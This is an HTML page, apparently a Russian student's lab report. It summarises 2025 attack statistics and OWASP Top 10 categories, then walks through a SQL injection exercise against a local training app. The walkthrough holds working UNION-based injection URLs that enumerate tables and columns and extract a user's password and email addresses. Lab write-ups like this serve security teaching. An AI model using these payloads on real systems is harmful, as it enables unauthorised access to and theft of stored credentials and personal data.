@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Converted from Markdown</title>
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+      line-height: 1.6; 
+      max-width: 800px; 
+      margin: 0 auto; 
+      padding: 20px;
+      color: #333;
+    }
+    h1, h2, h3 { color: #333; margin-top: 1.5em; margin-bottom: 0.5em; }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    h3 { font-size: 1.2em; }
+    code { 
+      background: #f4f4f4; 
+      padding: 2px 4px; 
+      border-radius: 3px; 
+      font-family: 'Courier New', monospace;
+    }
+    pre { 
+      background: #f4f4f4; 
+      padding: 15px; 
+      border-radius: 5px; 
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.4;
+    }
+    blockquote { 
+      border-left: 4px solid #ddd; 
+      margin: 1em 0; 
+      padding-left: 20px; 
+      color: #666;
+      font-style: italic;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1em 0;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+    }
+    ul, ol {
+      margin: 1em 0;
+      padding-left: 2em;
+    }
+    li {
+      margin: 0.5em 0;
+    }
+  </style>
+</head>
+<body>
+<h1>ВНИМАНИЕ:</h1>
+<p>В процессе выполнения лабораторной работы схема была такая: Сначала выполняем запрос, потом смотрим результат(следовательно вставляем в файл уже после выполнения, поэтому в url появляются знаки %)</p>
+<h1>1 часть</h1>
+<h2>Ссылки на источники</h2>
+<ul>
+<li><a href="https://keepnetlabs.com/blog/2025-verizon-data-breach-investigations-report">https://keepnetlabs.com/blog/2025-verizon-data-breach-investigations-report</a>   - verzion dbir 2025</li>
+<li><a href="https://owasp.org/Top10/2025/">https://owasp.org/Top10/2025/</a>  - OWASP Top 10 2025</li>
+<li><a href="https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/#id5">https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/#id5</a> - positive technologies 2025</li>
+</ul>
+<p>По Positive Technologies в  31% случаев успешных атак на организации использовалась эксплуатация уязвимостей.</p>
+<p>По Verizon DBIR(по всему миру) 20% всех веб атак были связаны с эксплуатацией уязвимостей. Доля веб атак по всем кибератакам составляет 12%.</p>
+<p>21% - госучреждения <br>13% - промышленность <br>6% - it-компании <br>6% - медицинские учреждения <br>и т.д. </p>
+<p>всего 52% успешных атак на организации</p>
+<h4>часто встречающиеся веб уязвимости по Positive Technologies</h4>
+<ul>
+<li>удалённое выполнение кода - RCE</li>
+<li>подмена запросов на стороне сервера (SSRF)</li>
+<li>CRLF Injection</li>
+<li>удалённое выполнение кода и обход аутентификации</li>
+<li>чтение произвольных файлов</li>
+<li>переполнение кучи или стека</li>
+</ul>
+<h4>10 самых частых уязвимостей по категориям согласно OWASP Top 10 2025</h4>
+<p><em>Avg Incidence Rate (AIR)</em> -  средняя доля уязвимостей этой категории среди всех найденных уязвимостей. <br><em>Avg Coverage (AC)</em>  - доля приложений в которых обнаружена хотя бы одна уязвимость этой категории.</p>
+<ul>
+<li>Broken Access Control - AIR 3.74%, AC -  42,93%</li>
+<li>Security Misconfiguration - AIR 3%, AC -  52,35%</li>
+<li>Software Supply Chain Failures - AIR 5.72%, AC -  27,47%</li>
+<li>Cryptographic Failures - AIR 3.8%, AC -  47,74%</li>
+<li>Injection - AIR 3.08%, AC -  42,93%</li>
+<li>Insecure Design - AIR 1.86%, AC -  35,18%</li>
+<li>Authentication Failures - AIR 2.92%, AC -  37,14%</li>
+<li>Software or Data Integrity Failures - AIR 2.75%, AC -  45,49%</li>
+<li>Security Logging and Alerting Failures - AIR 3.91%, AC -  46,48%</li>
+<li>Mishandling of Exceptional Conditions - AIR 2.95%, AC -  37,95%</li>
+</ul>
+<h1>2 часть</h1>
+<p> Введите в качестве параметра ваш id
+   Сначала подумала, что его надо где-то взять. Спустя минуты 3 стало понятно, что надо что-то сделать с url. <br>    Для теста попробовала посмотреть пользователя с айди 1 <br>   <a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a> <br>Вроде ничего такого, но выглядит прикольно :) <br>Ваш id: 1 <br>Ваш логин: admin </p>
+<p>Думаю, таким образом я буду долго перебирать. Надо придумать что-то другое.
+Чисто ради интереса можно попробовать id =2 <br>Ваш id: 2 <br>Ваш логин: Volk </p>
+<p>хехех, но нужен пользователь Volk2... </p>
+<p>Вообще, чтобы получить что-то из sql таблицы, надо узнать для начала название таблицы, а потом названия колонок этой таблицы. Сейчас поищем на сайтике, как это сделать.
+Пупупу, надо же имя бд ещё узнать.</p>
+<p><a href="http://localhost:8080/task/?id=-1%20UNION%20SELECT%20database()--">http://localhost:8080/task/?id=-1%20UNION%20SELECT%20database()--</a>   пустая страница </p>
+<p><a href="http://localhost:8080/?id=1">http://localhost:8080/?id=1</a> UNION SELECT 1,database(),3-- пустая страница</p>
+<p>спустя ещё 5 похожих запросов: мдаа, это сложнее, чем кажется <br>ладно, допустим <br>методом тыка было обнаружено, что у пользователя Vinni-pukh id =4 <br><a href="http://localhost:8080/task/?id=4">http://localhost:8080/task/?id=4</a> <br>Ваш id: 4 <br>Ваш логин: Vinni-pukh </p>
+<p>точно также выяснилось, что у Volk2 id = 9 <br><a href="http://localhost:8080/task/?id=9">http://localhost:8080/task/?id=9</a> <br>Ваш id: 9 <br>Ваш логин: Vinni-pukh </p>
+<p>А также обнаружилось, что у нас всего 9 пользователей <br>потому что <br><a href="http://localhost:8080/task/?id=10">http://localhost:8080/task/?id=10</a> выдал пустую страницу</p>
+<p>Допустим, мы узнали id <br>теперь надо докопаться до паролей <br>ох, чувствую, узнать название таблицы всё же придётся <br>для начала попробую просто users <br><a href="http://localhost:8080/task/SELECT%20username%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20'users">http://localhost:8080/task/SELECT%20username%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20&#39;users</a>&#39; <br>Выдало Not Found <br>попытаться стоило</p>
+<p><a href="http://localhost:8080/task/?id=1%20UNION%20SELECT%20schema_name,2%20FROM%20information_schema.schemata--">http://localhost:8080/task/?id=1%20UNION%20SELECT%20schema_name,2%20FROM%20information_schema.schemata--</a> <br>опять не прокатило</p>
+<p>ОНО НЕ ВЫДАЁТ NOT FOUND, а потому что, оказывается, надо писать id=9&#39;  (всё решает кавычка...) <br><a href="http://localhost:8080/task/?id=9%27%20UNION%20SELECT%201,2%23">http://localhost:8080/task/?id=9%27%20UNION%20SELECT%201,2%23</a> <br>выдаёт: <br>The used SELECT statements have a different number of columns </p>
+<p>уже лучше, чем было, но колонок, наверное, побольше \</p>
+<p>теперь выяснилось, что у нас 3 колонки(теперь не выбрасывает ошибку) <br><a href="http://localhost:8080/task/?id=9%27%20UNION%20SELECT%201,2,3%23">http://localhost:8080/task/?id=9%27%20UNION%20SELECT%201,2,3%23</a> <br>Данные колонки 3 не выводятся, но их наверняка можно попробовать использовать в запросе <br>сначала попробуем выяснить название бд уже с использованием правильного синтаксиса</p>
+<p>ООООО <br><a href="http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,database(),3%23">http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,database(),3%23</a> <br>теперь мы знаем, что бд называется security и что AND 1=2 делает ложной первую часть запроса <br>Ваш id: 1 <br>Ваш логин: security</p>
+<p><a href="http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables%20WHERE%20table_schema=%27security%27%23">http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables%20WHERE%20table_schema=%27security%27%23</a> <br>чтобы не выбрасывало ошибку, всегда надо брать 3 колонки <br>Ваш id: 1 <br>Ваш логин: emails</p>
+<p>это не то, что я рассчитывала найти(хотелось бы пароли) <br>но для второго задания в самый раз <br>попробуем достать все таблицы, добавив GROUP_CONCAT <br>(P.S. со временем даже можно войти во вкус с такими запросами:) )</p>
+<p><a href="http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,GROUP_CONCAT(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=%27security%27%23">http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,GROUP_CONCAT(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=%27security%27%23</a> <br>Ваш id: 1 <br>Ваш логин: emails,users</p>
+<p>всё-таки, таблица users тут существует</p>
+<p>Теперь надо узнать, что за колонки лежат в таблице users <br><a href="http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,%20GROUP_CONCAT(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27%23">http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,%20GROUP_CONCAT(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27%23</a> <br>Ваш id:1 <br>Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
+<p>Видна заветная колонка password</p>
+<p>Начинается программа &quot;почувствуй себя хакером на время выполнения лабы&quot; <br><a href="http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,%20password,%203%20FROM%20users%20WHERE%20username=%27Volk2%27%23">http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,%20password,%203%20FROM%20users%20WHERE%20username=%27Volk2%27%23</a> <br>Ваш id: 1 <br>Ваш логин: Wa spoiuuuuu</p>
+<p>Пароль пользователя Volk2 вычислен</p>
+<p>Самое время узнать почту пользователя Vinni-pukh</p>
+<p>Но сначала узнаем, какие есть колонки в таблице emails <br><a href="http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=%27emails%27%23">http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=%27emails%27%23</a> <br>Ваш id: 1 <br>Ваш логин: id,email_id</p>
+<p>может, есть какая-то скрытая таблица или колонка? <br>там в users была какая-то колонка total_connections, сейчас посмотрим <br>хорошо бы ещё проверить 3 колонку, которую мы не видели в самом начале, но это чуть позже <br>Сначала посмотрим, что вообще лежит в колонке email_id <br><a href="http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,%20email_id,%203%20FROM%20emails%20WHERE%20id=9%23">http://localhost:8080/task/?id=9%27%20AND%201=2%20UNION%20SELECT%201,%20email_id,%203%20FROM%20emails%20WHERE%20id=9%23</a> <br>Ваш id: 1 <br>Ваш логин:<a href="mailto:volk@otus-lab.com">volk@otus-lab.com</a></p>
+<p>а я думала, что email_id - это id почты в какой-то другой спрятанной таблице... <br>Но ладно :) <br>Заодно и почту Volk2 узнали</p>
+<p>теперь почту винни пуха посмотрим <br><a href="http://localhost:8080/task/?id=4%27%20AND%201=2%20UNION%20SELECT%201,%20email_id,%203%20FROM%20emails%20WHERE%20id%20=%204%23">http://localhost:8080/task/?id=4%27%20AND%201=2%20UNION%20SELECT%201,%20email_id,%203%20FROM%20emails%20WHERE%20id%20=%204%23</a> <br>Ваш id: 1 <br>Ваш логин:<a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></p>
+<h1>Итог</h1>
+<ol>
+<li>Пароль пользователя Volk2: Wa spoiuuuuu</li>
+<li>Почта пользователя Vinni-pukh: <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></li>
+</ol>
+
+</body>
+</html>
